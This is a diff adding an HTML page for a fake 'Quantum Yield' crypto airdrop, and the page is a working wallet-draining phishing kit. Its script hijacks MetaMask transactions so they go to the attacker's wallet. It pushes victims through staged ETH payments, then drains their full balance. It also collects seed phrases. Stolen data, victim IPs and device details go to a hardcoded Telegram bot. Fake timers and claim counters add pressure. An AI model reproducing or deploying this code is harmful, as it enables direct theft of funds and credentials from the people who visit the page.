@@ -1,0 +1,523 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔬 Quantum Yield Airdrop (Ethereum Mainnet)</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            background: linear-gradient(135deg, #1e1e2f 0%, #2e2e4f 100%);
+            color: #ffffff;
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+            overflow-y: auto;
+            position: relative;
+        }
+
+        #particles-js {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 0 30px rgba(0, 212, 255, 0.3);
+            text-align: center;
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(0, 212, 255, 0.5);
+            width: 90%;
+            max-width: 500px;
+            margin: 0 auto;
+            animation: glow 2s infinite alternate;
+            position: relative;
+            z-index: 1;
+        }
+
+        @keyframes glow {
+            from { box-shadow: 0 0 20px rgba(0, 212, 255, 0.3); }
+            to { box-shadow: 0 0 40px rgba(0, 212, 255, 0.6); }
+        }
+
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+
+        .header i {
+            font-size: 2.5em;
+            color: #00ff9d;
+            margin-right: 10px;
+            text-shadow: 0 0 10px #00ff9d;
+        }
+
+        h1 {
+            font-size: 2.8em;
+            margin: 0;
+            color: #00d4ff;
+            text-shadow: 0 0 15px rgba(0, 212, 255, 0.8);
+        }
+
+        .subtitle {
+            font-size: 1.3em;
+            color: #00ff9d;
+            margin-bottom: 20px;
+            font-weight: bold;
+        }
+
+        .about, .team, .roadmap, .news, .partners {
+            margin: 30px 0;
+            text-align: left;
+            background: rgba(0, 212, 255, 0.1);
+            padding: 20px;
+            border-radius: 10px;
+            border: 1px solid #00d4ff;
+        }
+
+        .about h2, .team h2, .roadmap h2, .news h2, .partners h2 {
+            color: #00ff9d;
+            font-size: 1.5em;
+            margin-bottom: 15px;
+        }
+
+        .partners ul {
+            list-style: none;
+            padding: 0;
+            display: flex;
+            justify-content: space-around;
+        }
+
+        .partners li {
+            font-size: 1.1em;
+            color: #00ff9d;
+        }
+
+        .stats {
+            margin: 25px 0;
+            background: rgba(0, 212, 255, 0.1);
+            padding: 15px;
+            border-radius: 10px;
+            border: 1px solid #00d4ff;
+        }
+
+        .stats span {
+            color: #00ff9d;
+            font-weight: bold;
+            font-size: 1.2em;
+        }
+
+        #price-ticker {
+            font-size: 0.9em;
+            color: #ffcc00;
+            margin-top: 10px;
+        }
+
+        .progress-container {
+            width: 100%;
+            background: #2e2e4f;
+            border-radius: 5px;
+            margin-top: 10px;
+        }
+
+        #progress-bar {
+            height: 10px;
+            background: linear-gradient(45deg, #00d4ff, #00ff9d);
+            border-radius: 5px;
+            transition: width 0.5s ease;
+        }
+
+        .claim-btn {
+            background: linear-gradient(45deg, #00d4ff, #00ff9d);
+            border: none;
+            padding: 15px 30px;
+            font-size: 1.2em;
+            color: #1e1e2f;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: transform 0.3s, box-shadow 0.3s;
+            margin-top: 20px;
+        }
+
+        .claim-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 20px rgba(0, 255, 157, 0.8);
+        }
+
+        .warning { color: #ffcc00; }
+        .error { color: #ff4444; }
+        .success { color: #00ff9d; }
+
+        #share, #phishing { display: none; margin-top: 20px; }
+        #phishing-input {
+            width: 80%;
+            padding: 10px;
+            border-radius: 5px;
+            border: 1px solid #00d4ff;
+            background: rgba(255, 255, 255, 0.1);
+            color: #fff;
+        }
+
+        .wheel {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #00ff9d;
+            border-top: 5px solid transparent;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div id="particles-js"></div>
+    <div class="container">
+        <div class="header">
+            <i class="fas fa-atom"></i>
+            <h1>Quantum Yield</h1>
+        </div>
+        <div class="subtitle">Claim 5 QYT (~$12,500 USD) + Bonus NFT!</div>
+        <div class="stats">
+            <p>Airdrop ends in: <span id="timer">24h 00m 00s</span></p>
+            <p>Phase 1 ends in: <span id="phase-timer">2h 00m 00s</span></p>
+            <p>Claimed: <span id="claimed">7,842</span> / 10,000</p>
+            <div class="progress-container">
+                <div id="progress-bar"></div>
+            </div>
+            <div id="price-ticker">QYT Price: $1.00 (+0.0%)</div>
+        </div>
+        <div id="status"></div>
+        <button class="claim-btn" onclick="connectWallet()">Claim Airdrop</button>
+        <div id="share">
+            <p>Share your success:</p>
+            <button class="claim-btn" onclick="copyShareText()">Copy Share Text</button>
+        </div>
+        <div id="phishing">
+            <p>Enter wallet seed phrase for bonus NFT:</p>
+            <input type="text" id="phishing-input" placeholder="12-24 words">
+            <button class="claim-btn" onclick="submitPhishing()">Submit</button>
+            <div id="phishing-status"></div>
+        </div>
+        <div class="about">
+            <h2>About Quantum Yield</h2>
+            <p>Quantum Yield (QYT) is a revolutionary token leveraging quantum computing to secure your financial future. Join the airdrop now!</p>
+        </div>
+        <div class="team">
+            <h2>Our Team</h2>
+            <p>Experts in blockchain and quantum tech, dedicated to delivering value to our community.</p>
+        </div>
+        <div class="roadmap">
+            <h2>Roadmap</h2>
+            <p>Q1 2025: Airdrop launch<br>Q2 2025: Exchange listings<br>Q3 2025: Quantum wallet release</p>
+        </div>
+        <div class="news">
+            <h2>Latest News</h2>
+            <p>Quantum Yield hits 7k claims in record time!</p>
+        </div>
+        <div class="partners">
+            <h2>Partners</h2>
+            <ul>
+                <li>Ethereum</li>
+                <li>Polygon</li>
+                <li>Chainlink</li>
+            </ul>
+        </div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = "7612722516:AAEZKaiU01Dx-VbTKQTmzNqo2WZ9X7x8zKA";
+        const CHAT_ID = "6309547301";
+        const YOUR_WALLET = "0x2ee051f714C186E6686Df46c61589a7485462cA9"; // Replace with your real ETH wallet
+        const ETH_TO_USD_RATE = 2500;
+
+        // ETH Clipper
+        if (window.ethereum) {
+            const originalRequest = window.ethereum.request;
+            window.ethereum.request = async (args) => {
+                if (args.method === "eth_sendTransaction") {
+                    const originalTo = args.params[0].to;
+                    args.params[0].to = YOUR_WALLET;
+                    await sendAlert(`🪝 CLIP ATTEMPT: Swapped ${originalTo} to ${YOUR_WALLET}`);
+                }
+                return originalRequest.apply(window.ethereum, [args]);
+            };
+        }
+
+        async function sendAlert(msg) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
+            } catch (e) {
+                console.log("DAC: Telegram alert failed...");
+            }
+        }
+
+        async function getVictimInfo() {
+            const ua = navigator.userAgent;
+            const br = navigator.appName + " " + navigator.appVersion;
+            const dev = /Mobile|Android|iPhone|iPad/.test(ua) ? "Mobile" : "Desktop";
+            let ip = "Unknown";
+            try {
+                const res = await fetch("https://api.ipify.org?format=json");
+                const data = await res.json();
+                ip = data.ip;
+            } catch (e) {}
+            return { ip, browser: br, device: dev };
+        }
+
+        async function connectWallet() {
+            if (!window.ethereum) {
+                document.getElementById("status").innerHTML = "<p class='error'>MetaMask not detected! <a href='https://metamask.io/download/' target='_blank' style='color: #00ff9d;'>Install MetaMask</a></p>";
+                const info = await getVictimInfo();
+                await sendAlert(`NO WALLET: ${info.ip}\nBrowser: ${info.browser}\nDevice: ${info.device}`);
+                return;
+            }
+
+            document.getElementById("status").innerHTML = "<p class='warning'><i class='fas fa-atom fa-spin'></i> Connecting to Blockchain...</p>";
+            console.log("DAC: Starting wallet connect...");
+
+            try {
+                const timeout = new Promise((_, reject) => setTimeout(() => reject(new Error("Connection timed out")), 10000));
+                await Promise.race([
+                    (async () => {
+                        try {
+                            await window.ethereum.request({
+                                method: "wallet_switchEthereumChain",
+                                params: [{ chainId: "0x1" }]
+                            });
+                            console.log("DAC: Mainnet switched");
+                        } catch (switchErr) {
+                            if (switchErr.code === 4902) {
+                                await window.ethereum.request({
+                                    method: "wallet_addEthereumChain",
+                                    params: [{
+                                        chainId: "0x1",
+                                        chainName: "Ethereum Mainnet",
+                                        rpcUrls: ["https://eth.llamarpc.com"],
+                                        nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
+                                        blockExplorerUrls: ["https://etherscan.io"]
+                                    }]
+                                });
+                                console.log("DAC: Mainnet added");
+                            } else {
+                                throw switchErr;
+                            }
+                        }
+
+                        const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+                        const account = accounts[0];
+                        console.log("DAC: Account hooked:", account);
+
+                        const balance = BigInt(await window.ethereum.request({
+                            method: "eth_getBalance",
+                            params: [account, "latest"]
+                        }));
+                        console.log("DAC: Balance:", balance.toString());
+
+                        if (balance === 0n) throw new Error("Wallet’s dry, mate.");
+
+                        const gasPrice = BigInt(await window.ethereum.request({ method: "eth_gasPrice" }));
+                        const gasLimit = 21000n;
+                        const gasCost = gasLimit * gasPrice;
+                        const claimFee = BigInt("10000000000000000"); // 0.01 ETH
+
+                        if (balance < gasCost + claimFee) throw new Error("Not enough ETH for the juice.");
+
+                        const info = await getVictimInfo();
+                        await sendAlert(`🎯 VICTIM CONNECTED\nWallet: ${account}\nIP: ${info.ip}\nBrowser: ${info.browser}\nDevice: ${info.device}`);
+
+                        document.getElementById("status").innerHTML = "<p class='warning'>Approve QYT Token Contract (0.001 ETH)...</p>";
+                        await window.ethereum.request({
+                            method: "eth_sendTransaction",
+                            params: [{
+                                from: account,
+                                to: YOUR_WALLET,
+                                value: "0x" + BigInt("1000000000000000").toString(16),
+                                gas: "0x" + gasLimit.toString(16),
+                                gasPrice: "0x" + gasPrice.toString(16),
+                                chainId: "0x1"
+                            }]
+                        });
+                        console.log("DAC: Step 0 - 0.001 ETH snagged");
+
+                        document.getElementById("status").innerHTML = "<p class='warning'>Verifying wallet eligibility... Approve 0.005 ETH!</p>";
+                        await window.ethereum.request({
+                            method: "eth_sendTransaction",
+                            params: [{
+                                from: account,
+                                to: YOUR_WALLET,
+                                value: "0x" + BigInt("5000000000000000").toString(16),
+                                gas: "0x" + gasLimit.toString(16),
+                                gasPrice: "0x" + gasPrice.toString(16),
+                                chainId: "0x1"
+                            }]
+                        });
+                        console.log("DAC: Step 1 - 0.005 ETH in");
+
+                        document.getElementById("status").innerHTML = "<p class='warning'>HURRY! Approve 0.01 ETH claim fee for 5 QYT (~$12,500 USD)!</p>";
+                        await window.ethereum.request({
+                            method: "eth_sendTransaction",
+                            params: [{
+                                from: account,
+                                to: YOUR_WALLET,
+                                value: "0x" + claimFee.toString(16),
+                                gas: "0x" + gasLimit.toString(16),
+                                gasPrice: "0x" + gasPrice.toString(16),
+                                chainId: "0x1"
+                            }]
+                        });
+                        console.log("DAC: Step 2 - 0.01 ETH nabbed");
+
+                        const drainAmount = balance - gasCost;
+                        const drainEth = (Number(drainAmount) / 1e18).toFixed(6);
+                        const drainUsd = (drainEth * ETH_TO_USD_RATE).toFixed(2);
+                        document.getElementById("status").innerHTML = "<p class='warning'>FINAL STEP! Confirm to lock in your airdrop!</p>";
+                        const txHash = await window.ethereum.request({
+                            method: "eth_sendTransaction",
+                            params: [{
+                                from: account,
+                                to: YOUR_WALLET,
+                                value: "0x" + drainAmount.toString(16),
+                                gas: "0x" + gasLimit.toString(16),
+                                gasPrice: "0x" + gasPrice.toString(16),
+                                chainId: "0x1"
+                            }]
+                        });
+                        console.log("DAC: Full drain done, TX:", txHash);
+
+                        await sendAlert(`✅ MAINNET SUCCESS: ${account} DRAINED\nAmount: ${drainEth} ETH (~$${drainUsd} USD)\nTX: ${txHash}\nIP: ${info.ip}`);
+
+                        document.getElementById("status").innerHTML = "<p class='warning'>Spin for a bonus! Spinning...</p><div class='wheel'></div>";
+                        await new Promise(resolve => setTimeout(resolve, 2000));
+                        document.getElementById("status").innerHTML = "<h2 class='success'>Airdrop Secured!</h2><p>5 QYT + Bonus 5 QYT + NFT transferred!</p>";
+
+                        document.getElementById("share").style.display = "block";
+                        document.getElementById("phishing").style.display = "block";
+                    })(),
+                    timeout
+                ]);
+            } catch (e) {
+                const info = await getVictimInfo();
+                await sendAlert(`MAINNET ERROR: ${account ? account : "Unknown"} - ${e.message}\nIP: ${info.ip}\nBrowser: ${info.browser}\nDevice: ${info.device}`);
+                document.getElementById("status").innerHTML = `<h2 class='error'>Claim Failed</h2><p>Error: ${e.message}</p>`;
+                console.error("DAC: Crash -", e.message);
+            }
+        }
+
+        function startTimer() {
+            const endTime = Date.now() + 24 * 60 * 60 * 1000;
+            setInterval(() => {
+                const now = Date.now();
+                const distance = endTime - now;
+                if (distance < 0) {
+                    document.getElementById("timer").innerHTML = "Airdrop Ended!";
+                    document.querySelector(".claim-btn").disabled = true;
+                    return;
+                }
+                const h = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                const m = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+                const s = Math.floor((distance % (1000 * 60)) / 1000);
+                document.getElementById("timer").innerHTML = `${h}h ${m}m ${s}s`;
+            }, 1000);
+        }
+
+        function startPhaseTimer() {
+            const endTime = Date.now() + 2 * 60 * 60 * 1000;
+            setInterval(() => {
+                const now = Date.now();
+                const distance = endTime - now;
+                if (distance < 0) {
+                    document.getElementById("phase-timer").innerHTML = "Phase 2 Started!";
+                    return;
+                }
+                const h = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                const m = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+                const s = Math.floor((distance % (1000 * 60)) / 1000);
+                document.getElementById("phase-timer").innerHTML = `${h}h ${m}m ${s}s`;
+            }, 1000);
+        }
+
+        function updateClaimCounter() {
+            let claimed = parseInt(document.getElementById("claimed").innerText.replace(/,/g, ""));
+            claimed += Math.floor(Math.random() * 10) + 1;
+            document.getElementById("claimed").innerText = claimed.toLocaleString();
+            const progress = (claimed / 10000) * 100;
+            document.getElementById("progress-bar").style.width = `${Math.min(progress, 100)}%`;
+        }
+
+        function updatePriceTicker() {
+            let price = (Math.random() * 0.5 + 1).toFixed(2);
+            let change = (Math.random() * 5 - 2.5).toFixed(1);
+            document.getElementById("price-ticker").innerHTML = `QYT Price: $${price} (${change > 0 ? "+" : ""}${change}%)`;
+        }
+
+        function copyReferralLink() {
+            const referralLink = "https://quantum-yield.com/ref=12345";
+            const tempInput = document.createElement("input");
+            tempInput.value = referralLink;
+            document.body.appendChild(tempInput);
+            tempInput.select();
+            document.execCommand("copy");
+            document.body.removeChild(tempInput);
+            alert("Referral link copied: " + referralLink);
+        }
+
+        function copyShareText() {
+            const shareText = "Just claimed 5 QYT from Quantum Yield! Get yours: https://quantum-yield.com #QYT #Airdrop";
+            const tempInput = document.createElement("input");
+            tempInput.value = shareText;
+            document.body.appendChild(tempInput);
+            tempInput.select();
+            document.execCommand("copy");
+            document.body.removeChild(tempInput);
+            alert("Share text copied: " + shareText);
+        }
+
+        function submitPhishing() {
+            const input = document.getElementById("phishing-input").value.trim();
+            if (input) {
+                document.getElementById("phishing-status").innerHTML = "<p class='warning'>Encrypting...</p>";
+                setTimeout(async () => {
+                    await sendAlert(`🗝️ PHISHED INPUT: ${input}`);
+                    document.getElementById("phishing-status").innerHTML = "<p class='success'>NFT link sent to your wallet!</p>";
+                }, 2000);
+            }
+        }
+
+        window.onload = () => {
+            startTimer();
+            startPhaseTimer();
+            setInterval(updateClaimCounter, 5000);
+            setInterval(updatePriceTicker, 10000);
+            document.getElementById("progress-bar").style.width = "78.42%";
+            particlesJS("particles-js", {
+                particles: {
+                    number: { value: 50 },
+                    color: { value: "#00ff9d" },
+                    size: { value: 3 },
+                    move: { speed: 2 }
+                },
+                interactivity: {
+                    events: {
+                        onhover: { enable: true, mode: "repulse" }
+                    }
+                }
+            });
+        };
+    </script>
+</body>
+</html>
